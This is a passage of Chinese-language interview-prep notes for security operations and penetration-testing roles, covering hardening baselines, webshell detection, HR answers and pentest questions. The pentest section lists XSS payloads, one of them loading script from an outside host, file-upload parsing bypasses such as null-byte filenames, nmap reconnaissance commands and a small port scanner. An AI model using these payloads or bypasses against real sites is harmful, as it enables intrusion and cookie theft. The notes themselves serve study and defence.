id="日志">日志</h4><ul><li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li><li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li></ul><h4 id="IP协议安全要求">IP协议安全要求</h4><ul><li>远程登录取消telnet采用ssh</li><li>设置/etc/hosts.allow和deny</li><li>禁止ICMP重定向</li><li>禁止源路由转发</li><li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li></ul><h3 id="中间件基线规范（APACHE）">中间件基线规范（APACHE）</h3><blockquote><p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p></blockquote><h4 id="配置">配置</h4><ul><li>账号</li><li>授权</li><li>日志</li><li>session过期时间（防ddos</li><li>绑定监听地址</li></ul><h4 id="禁止">禁止</h4><ul><li>目录权限</li><li>访问外部文件</li><li>CGI</li><li>非法HTTP方法（PUT DELETE）</li></ul><h4 id="隐藏">隐藏</h4><ul><li>服务版本号</li><li>重定向错误页面</li></ul><h4 id="删除">删除</h4><ul><li>配置文件</li><li>默认安装的无用文件</li></ul><h3 id="webshell检测思路">webshell检测思路</h3><blockquote><p><a href="https://blog.csdn.net/u011066706/article/details/51175971" target="_blank" rel="noopener">https://blog.csdn.net/u011066706/article/details/51175971</a></p></blockquote><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。</p><p>黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p><h4 id="静态检测">静态检测</h4><p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。</p><p>优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p><p>静态检测配合人工</p><p>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a></p><h4 id="动态检测">动态检测</h4><p>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p><p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><h4 id="日志检测">日志检测</h4><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p><h4 id="语法检测">语法检测</h4><p>实现关键危险函数的捕捉方式</p><h4 id="统计学检测">统计学检测</h4><p>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。<br>典型的代表: NeoPI – <a href="https://github.com/Neohapsis/NeoPI" target="_blank" rel="noopener">https://github.com/Neohapsis/NeoPI</a></p><h4 id="防范webshell">防范webshell</h4><blockquote><p><a href="https://blog.csdn.net/nohaoye/article/details/46987587" target="_blank" rel="noopener">https://blog.csdn.net/nohaoye/article/details/46987587</a></p></blockquote><p>防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p><h3 id="计划任务">计划任务</h3><blockquote><p><a href="https://blog.csdn.net/kx_nullpointer/article/details/21299873" target="_blank" rel="noopener">https://blog.csdn.net/kx_nullpointer/article/details/21299873</a></p></blockquote><ol><li><code>at</code></li><li><code>batch</code></li><li><code>crontab</code></li><li><code>anacron</code>：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次</li></ol><h3 id="自动化运维编写过什么脚本">自动化运维编写过什么脚本</h3><h3 id="yum用的什么源（本地自搭，挂载）">yum用的什么源（本地自搭，挂载）</h3><h3 id="awk-sed的使用">awk sed的使用</h3><h3 id="排错思路，排错经验">排错思路，排错经验</h3><p>网络 防火墙 配置 权限</p><h3 id="日志分析ELK的使用和分析">日志分析ELK的使用和分析</h3><blockquote><p><a href="https://www.zhihu.com/question/21427267" target="_blank" rel="noopener">https://www.zhihu.com/question/21427267</a></p></blockquote><ul><li>Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</li><li>Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。</li><li>Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。</li></ul><p>举例-阿里规范<br>用户历史命令记录</p><p>缺点：安全性不够。使用x-pack实现安全认证及权限管理功能</p><h4 id="事件发生的分析">事件发生的分析</h4><h3 id="用户权限管理-修改">用户权限管理(修改)</h3><h3 id="防火墙">防火墙</h3><h3 id="IPsec-VPN">IPsec VPN</h3><h3 id="安全监控工具">安全监控工具</h3><ul><li>web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计</li><li>zabbix性能监控工具</li><li>HIDS</li></ul><h3 id="Linux木马查杀">Linux木马查杀</h3><h3 id="常见的设备有啥">常见的设备有啥</h3><ul><li>防火墙 utm 负载均衡设备</li><li>IPS IDS(HIDS基于主机型入侵检测系统)</li><li>堡垒机</li><li>蜜罐</li><li>网闸</li><li>waf</li><li>扫描器</li><li>soc(ossim开源安全信息管理系统)</li></ul><h2 id="Windows运维">Windows运维</h2><h3 id="基线规范">基线规范</h3><h3 id="木马查杀">木马查杀</h3><p>脱壳，反汇编</p><h3 id="计划任务-2">计划任务</h3><ol><li><p>控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务</p></li><li><p><code>schtasks</code>命令<br>语法:<br><code>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /?</code></p></li></ol><h2 id="ISO27000和等保-重点等保">ISO27000和等保(重点等保)</h2><h3 id="说一下ISO27000">说一下ISO27000</h3><p>ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。</p><p>PDCA（plan do check action）管理循环</p><h3 id="说一下等级保护制度">说一下等级保护制度</h3><p>《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。</p><h3 id="差异">差异</h3><blockquote><p>浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044</p></blockquote><p>等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全</p><h3 id="共性">共性</h3><h2 id="算法">算法</h2><h3 id="排序算法：快排-二分-冒泡">排序算法：快排 二分 冒泡</h3><h2 id="LDAP注入">LDAP注入</h2><blockquote><p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">http://www.4hou.com/technology/9090.html</a><br><a href="https://blog.csdn.net/quiet_girl/article/details/50716312" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50716312</a></p></blockquote><ul><li><a href="#hr%E9%9D%A2">HR面</a><ul><li><a href="#%E9%97%AE%E9%A2%98">问题</a><ul><li><a href="#%E5%AF%B9%E6%88%91%E4%BB%AC%E5%85%AC%E5%8F%B8%E6%9C%89%E4%BB%80%E4%B9%88%E4%BA%86%E8%A7%A3%E4%B8%BA%E4%BB%80%E4%B9%88%E9%80%89%E6%8B%A9%E6%9C%AC%E5%85%AC%E5%8F%B8">对我们公司有什么了解，为什么选择本公司</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%83%B3%E8%A6%81%E5%BA%94%E8%81%98%E8%BF%99%E4%B8%AA%E8%81%8C%E4%BD%8D">为什么想要应聘这个职位</a></li><li><a href="#%E5%AF%B9%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E6%98%AF%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3%E7%9A%84">对安全服务是怎么理解的</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%A4%E5%88%86%E9%92%9F%E8%AF%B4%E4%B8%80%E4%B8%8B">如果我不知道渗透测试，两分钟说一下</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E6%B1%BD%E8%BD%A6%E5%8E%82%E5%95%86%E4%BD%A0%E5%A6%82%E4%BD%95%E8%AF%81%E6%98%8E%E4%BD%A0%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%98%AF%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li><li><a href="#%E4%BD%9C%E4%B8%BA%E5%BA%94%E5%B1%8A%E7%94%9F%E4%BD%A0%E5%A6%82%E4%BD%95%E8%83%BD%E8%83%9C%E4%BB%BB%E8%AF%A5%E8%81%8C%E4%BD%8D">作为应届生，你如何能胜任该职位</a></li><li><a href="#%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E8%81%8C%E4%B8%9A%E8%A7%84%E5%88%92">你有什么职业规划</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E7%A6%BB%E8%81%8C%E7%9A%84%E8%AF%9D%E6%98%AF%E5%9B%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0">如果离职的话是因为什么原因</a></li><li><a href="#%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9">你有什么优缺点</a></li><li><a href="#%E5%AF%B9%E4%BA%8E%E8%96%AA%E8%B5%84%E7%9A%84%E8%A6%81%E6%B1%82">对于薪资的要求</a></li><li><a href="#%E7%BB%99%E4%B8%8D%E4%BA%86%E8%BF%99%E4%B9%88%E5%A4%9A%E5%B7%A5%E8%B5%84%E5%8F%AF%E4%BB%A5%E6%8E%A5%E5%8F%97%E5%90%97%E4%B8%BA%E4%BB%80%E4%B9%88%E6%83%B3%E8%A6%81%E8%BF%99%E4%B8%AA%E6%95%B0">给不了这么多工资可以接受吗？为什么想要这个数？</a></li><li><a href="#%E8%BF%9B%E5%85%A5%E9%83%A8%E9%97%A8%E5%90%8E%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A4%9A%E9%95%BF%E6%97%B6%E9%97%B4%E8%BF%9B%E5%85%A5%E9%A1%B9%E7%9B%AE">进入部门后，你需要多长时间进入项目？</a></li><li><a href="#%E4%B8%8A%E4%B8%80%E4%B8%AA%E9%9D%A2%E8%AF%95%E7%9A%84%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%B7%9F%E4%BD%A0%E5%B7%AE%E4%B8%8D%E5%A4%9A%E4%BD%86%E6%98%AF%E5%B7%A5%E8%B5%84%E6%96%B9%E9%9D%A2%E6%AF%94%E4%BD%A0%E8%A6%81%E7%9A%84%E4%BD%8E">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li><li><a href="#%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%8E%A5%E5%8F%97%E5%8A%A0%E7%8F%AD">是否可以接受加班</a></li><li><a href="#%E6%B2%9F%E9%80%9A%E8%83%BD%E5%8A%9B%E5%92%8C%E9%A2%86%E5%AF%BC%E5%90%8C%E4%BA%8B%E4%BA%A7%E7%94%9F%E5%88%86%E6%AD%A7%E4%BC%9A%E6%80%8E%E4%B9%88%E5%8A%9E">（沟通能力）和领导、同事产生分歧会怎么办</a></li><li><a href="#%E5%B7%A5%E4%BD%9C%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%B7%A5%E4%BD%9C%E4%B8%8D%E6%98%AF%E6%83%B3%E8%B1%A1%E4%B8%AD%E7%9A%84%EF%BC%8C%E4%BC%9A%E6%80%8E%E4%B9%88%E5%8A%9E/%E5%AF%B9%E8%B7%B3%E6%A7%BD%E7%9A%84%E7%9C%8B%E6%B3%95">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li><li><a href="#%E5%AF%B9%E4%B8%8A%E5%8F%B8%E6%9C%89%E4%BB%80%E4%B9%88%E8%A6%81%E6%B1%82%E5%96%9C%E6%AC%A2%E5%92%8C%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E9%A2%86%E5%AF%BC%E5%90%88%E4%BD%9C">对上司有什么要求？喜欢和什么样的领导合作？</a></li><li><a href="#%E6%9C%80%E6%9C%89%E5%BD%B1%E5%93%8D%E7%9A%84%E4%B8%80%E4%BB%B6%E4%BA%8B%E4%BA%BA">最有影响的一件事/人</a></li><li><a href="#%E4%BD%A0%E8%BF%98%E8%A6%81%E9%97%AE%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98">你还要问什么问题</a></li></ul></li></ul></li></ul><h1>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p><h2 id="问题">问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司">对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p><h3 id="为什么想要应聘这个职位">为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p><h3 id="对安全服务是怎么理解的">对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p><ul><li>安全概念和资讯</li><li>安全工具使用</li><li>渗透测试</li><li>安全基线检查</li><li>应急响应</li><li>代码审计</li><li>安全边界建设</li><li>安全规范</li></ul><h3 id="如果我不知道渗透测试，两分钟说一下">如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p><h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p><h3 id="作为应届生，你如何能胜任该职位">作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p><h3 id="你有什么职业规划">你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p><h3 id="如果离职的话是因为什么原因">如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p><h3 id="你有什么优缺点">你有什么优缺点</h3><ul><li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li><li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li></ul><h3 id="对于薪资的要求">对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p><h3 id="给不了这么多工资可以接受吗？为什么想要这个数？">给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol><li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li><li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li><li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li></ol><h3 id="进入部门后，你需要多长时间进入项目？">进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p><h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p><h3 id="是否可以接受加班">是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p><h3 id="（沟通能力）和领导、同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p><h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p><h3 id="对上司有什么要求？喜欢和什么样的领导合作？">对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p><h3 id="最有影响的一件事-人">最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p><h3 id="你还要问什么问题">你还要问什么问题</h3><ul><li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li><li>五险一金、社保比例、饭补、餐补、交通补助？</li><li>应聘岗位具体职责和工作内容？会不会经常出差？</li><li>试用期多久？薪水多少？</li></ul><h2 id="渗透工程师面试题总结">渗透工程师面试题总结</h2><h4 id="拿到一个待检测的站，你觉得应该先做什么？">拿到一个待检测的站，你觉得应该先做什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">whois</span><br><span class="line">http://whois.chinaz.com/</span><br><span class="line">网站源ip</span><br><span class="line">http://ip.tool.chinaz.com/bilibili.com</span><br><span class="line">二级域名</span><br><span class="line">扫描器(代码待定)</span><br><span class="line">C段网站</span><br><span class="line">cScan.py</span><br><span class="line">服务器系统版本、容器版本</span><br><span class="line">云息指纹(代码待定)</span><br><span class="line">防火墙</span><br><span class="line">nmap -p80 --script http-waf-detect xxx.com</span><br><span class="line">端口</span><br><span class="line">nmap -sV -T4 -O -Pn  xxx.xxx.xx.xx</span><br></pre></td></tr></table></figure><p>cScan.py附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#查询</span></span><br><span class="line">print(<span class="string">'[*]查询中'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orf</span><span class="params">()</span>:</span></span><br><span class="line">  a=open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">  <span class="keyword">for</span> g <span class="keyword">in</span> a.readlines():</span><br><span class="line">    gv=g.strip(<span class="string">'\r'</span>).strip(<span class="string">'\n'</span>)</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      s.connect((gv,<span class="number">80</span>))</span><br><span class="line">      print(<span class="string">'该IP有网站:'</span>+gv)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#gib()</span></span><br><span class="line">orf()</span><br></pre></td></tr></table></figure><h4 id="主流数据库的SQL特有函数、存储过程">主流数据库的SQL特有函数、存储过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">MSSQL</span><br><span class="line">Oracle</span><br><span class="line">PostgreSQL</span><br><span class="line">Access</span><br><span class="line">SQLite</span><br></pre></td></tr></table></figure><h4 id="Wireshark语法">Wireshark语法</h4><h4 id="TCPdump">TCPdump</h4><h4 id="urllib2">urllib2</h4><h4 id="XSS类型和攻击原理">XSS类型和攻击原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">反射型xss</span><br><span class="line">在浏览器上运行一遍就会造成的攻击，运行一次，不会长时间留存</span><br><span class="line">存储型xss</span><br><span class="line">多见于评论处，恶意xss代码写进服务器中，每一次运行都会造成危害，长时间留存</span><br><span class="line">常见恶意代码如下</span><br><span class="line"> &gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"> &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;;</span><br><span class="line"> &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> &lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</span><br><span class="line"> &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h4 id="XSS的防御">XSS的防御</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对输入和URL进行编码过滤</span><br><span class="line">在输入端可以写一个 xss filter</span><br><span class="line"></span><br><span class="line">对输出进行编码</span><br><span class="line"></span><br><span class="line">使用httpOnly</span><br></pre></td></tr></table></figure><h4 id="解析漏洞">解析漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">IIS 6.0</span><br><span class="line">/xx.asp/xx.jpg &quot;xx.asp&quot;是文件夹名</span><br><span class="line"></span><br><span class="line">IIS 7.0/7.5</span><br><span class="line">默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</span><br><span class="line"></span><br><span class="line">Nginx</span><br><span class="line">版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。</span><br><span class="line">空字节代码 xxx.jpg%00.php</span><br><span class="line"></span><br><span class="line">Apache</span><br><span class="line">上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</span><br><span class="line"></span><br><span class="line">lighttpd</span><br><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure><h4 id="如何手工快速判断目标站是windows还是linux服务器？">如何手工快速判断目标站是windows还是linux服务器？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">大小写不敏感</span><br><span class="line">Linux</span><br><span class="line">大小写敏感</span><br></pre></td></tr></table></figure><h4 id="SRC常见的某些漏洞">SRC常见的某些漏洞</h4><p>可以面试的时候举例，具体还是自己经验为主</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">api接口发现有未授权漏洞</span><br><span class="line">websocket orgin头未验证</span><br><span class="line">重置密码处可以任意用户重置</span><br></pre></td></tr></table></figure><h4 id="垂直越权和水平越权">垂直越权和水平越权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">垂直越权</span><br><span class="line">低权限用户尝试访问高权限的目录</span><br><span class="line">盲猜admin.php</span><br><span class="line">水平越权</span><br><span class="line">枚举id，访问其他用户的页面</span><br></pre></td></tr></table></figure><h4 id="反序列化的原理">反序列化的原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中,反序列化即逆过程，由字节流还原成对象</span><br><span class="line">Java序列化</span><br><span class="line">WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞</span><br><span class="line">php序列化</span><br><span class="line">PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数</span><br></pre></td></tr></table></figure><h4 id="CSRF防御">CSRF防御</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过</span><br><span class="line"></span><br><span class="line">验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造</span><br><span class="line"></span><br><span class="line">使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。</span><br><span class="line"></span><br><span class="line">在访问登录过一个网站，点击退出账户。</span><br></pre></td></tr></table></figure><h4 id="SSRF防御">SSRF防御</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">过滤返回信息，如果web应用数去获取某一类型文件，在把结果返回给用户之前先验证信息是否符合标准。</span><br><span class="line"></span><br><span class="line">例如：当攻击者利用&quot;识别图片&quot;下的该漏洞远程包含一个文件，可以通过在服务器上验证返回数据是否是纯像素，来进行过滤。</span><br><span class="line"></span><br><span class="line">统一错误页</span><br><span class="line"></span><br><span class="line">限制请求端口为http常用端口 80,443,8080,8090</span><br><span class="line"></span><br><span class="line">内网IP黑名单，避免应用被用来获取内网数据，攻击内网</span><br></pre></td></tr></table></figure><h4 